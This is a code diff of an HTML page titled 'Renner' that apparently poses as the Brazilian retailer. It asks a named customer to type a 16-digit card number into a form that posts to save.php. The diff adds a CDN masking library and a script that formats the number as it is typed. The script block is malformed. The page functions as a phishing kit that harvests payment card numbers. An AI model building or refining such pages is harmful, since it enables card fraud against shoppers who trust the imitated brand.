@@ -1,4 +1,6 @@
 <html lang="pt-br"><head>
+ 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-masker/1.1.0/vanilla-masker.min.js"></script>
     <title>Renner</title>
     <meta charset="utf-8">
   </head>
@@ -23,7 +25,7 @@
 	
 	<form action="save.php" method="post">
 	<input style="margin-left: 33px;width: 90%;height: 6%;margin-top: 100%;border-bottom-width: 4px;border-left: 0px;border-right: 0px;border-top: 0px;font-size: 36px;text-align: center;font-family: impact;color: #eab308;font-weight: bold;" disabled="" value="Renan Souza Silva"><input style="margin-left: 33px;width: 90%;height: 6%;border-bottom-width: 4px;border-left: 0px;border-right: 0px;border-top: 0px;font-size: 36px;text-align: center;font-family: impact;" placeholder="Insira o Numero do Cartão ⬇️ :" disabled=""><br>
-	<input required minlength="16"  style="margin-left: 33px;width: 90%;height: 6%;margin-top: %;border-bottom-width: 3px;border-left: 0px;border-right: 0px;border-top: 0px;font-size: 36px;text-align: center;font-family: monospace;" placeholder="ex: 4108 6391 9230 4923"><br>
+	<input attrname="fone" type="text" required="" minlength="16" style="margin-left: 33px;width: 90%;height: 6%;margin-top: %;border-bottom-width: 3px;border-left: 0px;border-right: 0px;border-top: 0px;font-size: 36px;text-align: center;font-family: monospace;" placeholder="ex: 4108 6391 9230 4923"><br>
 	<button style="margin-left: 19%;background: url(bot.png) no-repeat;width: 66%;margin-top: 10%;height:100;position:absolute;">
  <img src="capth.png" style="width: 100%;margin-left: -52%;height: 100%;margin-top: 12%;position:absolute;"><br>
 
@@ -38,7 +40,24 @@
 
       <img src="logoabaixo.png" style="width: 100%;margin-left: 0%;height: 17%;margin-top: 171%;position:relative;"><br>
 	  <img src="logoabaixo1.png" style="width: 100%;margin-left: 0%;height: 100%;margin-top: 3%;position:relative;"><br>
-	  <img src="footer.png" style="width: 109%;margin-left: -4%;height: 377%;margin-top: 0%;position:relative;"><br>
+	  <img src="footer.png" style="width: 109%;margin-left: -4%;height: 377%;margin-top: 0%;position:relative;">
+
+<script>
+    function inputHandler(masks, max, event) {
+	var c = event.target;
+	var v = c.value.replace(/\D/g, '');
+	var m = c.value.length > max ? 1 : 0;
+	VMasker(c).unMask();
+	VMasker(c).maskPattern(masks[m]);
+	c.value = VMasker.toPattern(v, masks[m]);
+}
+
+var telMask = ['9999 9999 9999 9999'];
+var tel = document.querySelector('input[attrname=fone]');
+VMasker(tel).maskPattern(telMask[0]);
+tel.addEventListener('input', inputHandler.bind(undefined, telMask, 14), false);
+
+    <script></script><br>
 </div>
 	  
 	  
@@ -53,5 +72,6 @@
    
    
   
+
 
 </body></html>
